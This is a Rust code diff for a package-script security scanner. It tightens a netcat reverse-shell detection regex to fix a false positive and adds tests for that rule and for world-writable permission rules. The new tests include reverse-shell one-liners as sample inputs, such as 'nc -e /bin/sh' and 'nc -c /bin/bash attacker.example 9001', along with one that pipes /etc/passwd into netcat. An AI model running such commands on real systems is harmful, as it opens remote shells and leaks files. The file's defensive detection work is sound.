@@ -7,7 +7,7 @@ pub use loader::RuleLoader;
 use crate::error::Result;
 use crate::resolve::resolve_variables;
 use crate::textutil::{
-    deobfuscate, logical_lines, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
+    deobfuscate, logical_lines, CMD_START, QUOTE_SPLIT_PATTERN, SHELLS, SHELL_LAUNCHER, SHELL_PATH,
 };
 use crate::types::{Category, FileType, Severity};
 use regex::{Regex, RegexBuilder};
@@ -735,18 +735,29 @@ pub fn get_builtin_rules() -> Vec<Rule> {
         Rule {
             id: "SHELL-002".to_string(),
             name: "Netcat reverse shell".to_string(),
-            description: "Netcat with execute flag indicates reverse shell".to_string(),
+            description: "Netcat with an execute flag indicates a reverse shell".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![
+                // `nc`/`ncat`/`netcat` in COMMAND POSITION followed by an
+                // execute flag. Three things here are load-bearing, all of them
+                // from issue #32 (`git -C MEGAsync -c protocol.file.allow=...`
+                // reported as a Critical reverse shell):
+                //
+                // 1. `{CMD_START}` — an unanchored `nc` matches the tail of any
+                //    word ending in those two letters, and `MEGAsync ` is
+                //    followed by ` -c `, which is exactly the old pattern.
+                // 2. `[^\n;&|]*` rather than `.*` — the flag must belong to
+                //    THIS command, so a benign `-c` on a later command in the
+                //    same line (`nc -z host 80; git -c foo bar`) cannot be
+                //    borrowed to complete the match.
+                // 3. `-[A-Za-z]*[ec]\b` — covers bundled short flags (`-nve`)
+                //    while `--sh-exec`/`--exec` are listed separately, since a
+                //    long flag's leading `--` does not fit the short-flag form.
                 Pattern::Regex {
-                    pattern: r"nc\s+.*-e\s+".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r"ncat\s+.*-e\s+".to_string(),
-                },
-                Pattern::Regex {
-                    pattern: r"nc\s+.*-c\s+".to_string(),
+                    pattern: format!(
+                        r"{CMD_START}(?:nc|ncat|netcat)\b[^\n;&|]*\s(?:-[A-Za-z]*[ec]\b|--sh-exec\b|--exec\b)"
+                    ),
                 },
             ],
             file_types: vec![FileType::Pkgbuild, FileType::InstallScript],
@@ -3080,6 +3091,145 @@ mod tests {
             assert!(
                 m.iter().any(|x| x.rule_id == "INSTALL-002"),
                 "INSTALL-002 missed dropped script: {s} -> {m:?}"
+            );
+        }
+    }
+
+    /// Load the shipped community rules file into a fresh engine.
+    fn perm_engine() -> RuleEngine {
+        let path = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../install/rules.d");
+        let mut engine = RuleEngine::new();
+        engine
+            .load_rules_from_dir(&path)
+            .expect("shipped rules.d must load");
+        engine
+    }
+
+    #[test]
+    fn shipped_permission_rules_catch_world_writable() {
+        let engine = perm_engine();
+        let cases: &[(&str, &str)] = &[
+            (r#"chmod 777 "$pkgdir/usr/bin/foo""#, "PERM-001"),
+            (r#"chmod -R 777 "$pkgdir/opt/app""#, "PERM-001"),
+            (r#"chmod 0777 "$pkgdir/opt/app""#, "PERM-001"),
+            (r#"chmod 666 "$pkgdir/etc/foo.conf""#, "PERM-001"),
+            (r#"chmod 757 "$pkgdir/opt/x""#, "PERM-001"),
+            (r#"chmod 772 "$pkgdir/opt/x""#, "PERM-001"),
+            (r#"install -Dm777 bin "$pkgdir/usr/bin/bin""#, "PERM-001"),
+            (r#"install -m 666 f "$pkgdir/etc/f""#, "PERM-001"),
+            (r#"chmod o+w "$pkgdir/etc/foo.conf""#, "PERM-002"),
+            (r#"chmod a+w "$pkgdir/opt/app""#, "PERM-002"),
+            (r#"chmod ugo+w "$pkgdir/opt/app""#, "PERM-002"),
+            (r#"chmod -R o+w "$pkgdir/opt/app""#, "PERM-002"),
+            (r#"chmod o=rw "$pkgdir/etc/f""#, "PERM-002"),
+        ];
+        for (src, id) in cases {
+            let m = engine.match_content(src, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| &x.rule_id.as_str() == id),
+                "{id} missed world-writable: {src} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn shipped_permission_rules_ignore_ordinary_modes() {
+        // This is the whole difficulty of the rule (issue #8). These forms are
+        // in essentially every PKGBUILD ever written; a rule that fires on them
+        // teaches people to ignore the tool.
+        let engine = perm_engine();
+        for src in [
+            r#"chmod 755 "$pkgdir/usr/bin/foo""#,
+            r#"chmod 0755 "$pkgdir/usr/bin/foo""#,
+            r#"chmod 644 "$pkgdir/usr/share/foo/data""#,
+            r#"chmod 0644 "$pkgdir/usr/share/foo/data""#,
+            r#"chmod 700 "$pkgdir/var/lib/foo""#,
+            r#"chmod 600 "$pkgdir/etc/foo.key""#,
+            r#"chmod 111 "$pkgdir/opt/x""#,
+            r#"chmod -R 755 "$pkgdir/usr/share/foo""#,
+            r#"chmod 1777 "$pkgdir/var/tmp/foo""#,
+            r#"install -Dm644 LICENSE "$pkgdir/usr/share/licenses/foo/LICENSE""#,
+            r#"install -Dm755 target/release/foo "$pkgdir/usr/bin/foo""#,
+            r#"install -m 644 README "$pkgdir/usr/share/doc/foo/README""#,
+            r#"chmod u+x "$pkgdir/usr/bin/foo""#,
+            r#"chmod +x "$pkgdir/usr/bin/foo""#,
+            r#"chmod a+r "$pkgdir/usr/share/foo/data""#,
+            r#"chmod g+w "$pkgdir/var/lib/foo""#,
+            r#"chmod u+rw "$pkgdir/etc/foo""#,
+            r#"chmod o-w "$pkgdir/etc/foo""#,
+            r#"chmod a-w "$pkgdir/etc/foo""#,
+        ] {
+            let m = engine.match_content(src, FileType::Pkgbuild);
+            let hits: Vec<&str> = m
+                .iter()
+                .map(|x| x.rule_id.as_str())
+                .filter(|id| id.starts_with("PERM-"))
+                .collect();
+            assert!(
+                hits.is_empty(),
+                "ordinary mode must not fire a PERM rule: {src} -> {hits:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_shell002_no_fp_on_words_ending_in_nc() {
+        // Issue #32: `nc\s+.*-c\s+` matched the `nc` at the END of `MEGAsync`,
+        // turning a routine submodule checkout into a Critical reverse shell.
+        // Any word ending in `nc` followed by a `-c`/`-e` flag is the same trap.
+        let engine = RuleEngine::default();
+        for s in [
+            "git -C MEGAsync -c protocol.file.allow='always' submodule update",
+            "git -C MEGAsync -c protocol.file.allow=always submodule update --init",
+            "cd sync -c foo",
+            "./configure --with-func -e something",
+            "meson setup builddir -Dsync -c release",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "SHELL-002"),
+                "SHELL-002 false positive on: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_shell002_still_catches_real_netcat_shells() {
+        let engine = RuleEngine::default();
+        for s in [
+            "nc -e /bin/sh 10.0.0.1 4444",
+            "nc -c /bin/bash attacker.example 9001",
+            "ncat -e /bin/bash 10.0.0.1 4444",
+            "netcat -e /bin/sh 1.2.3.4 1234",
+            "/usr/bin/nc -e /bin/sh 10.0.0.1 4444",
+            "nc -nve /bin/sh 10.0.0.1 4444",
+            "ncat --sh-exec '/bin/bash' 10.0.0.1 4444",
+            "cat /etc/passwd | nc -e /bin/sh 10.0.0.1 4444",
+            "foo && nc -e /bin/sh 10.0.0.1 4444",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "SHELL-002"),
+                "SHELL-002 missed a real netcat shell: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_shell002_does_not_borrow_a_flag_from_a_later_command() {
+        // The execute flag must belong to the netcat invocation itself. A
+        // benign `-c` on a *different* command later in the same line must not
+        // complete the match.
+        let engine = RuleEngine::default();
+        for s in [
+            "nc -z example.com 80; git -c core.pager=cat log",
+            "nc -zv host 443 && git -c protocol.file.allow=always submodule update",
+            "nc -z host 80 | grep -c open",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "SHELL-002"),
+                "SHELL-002 borrowed a flag across a separator: {s} -> {m:?}"
             );
         }
     }
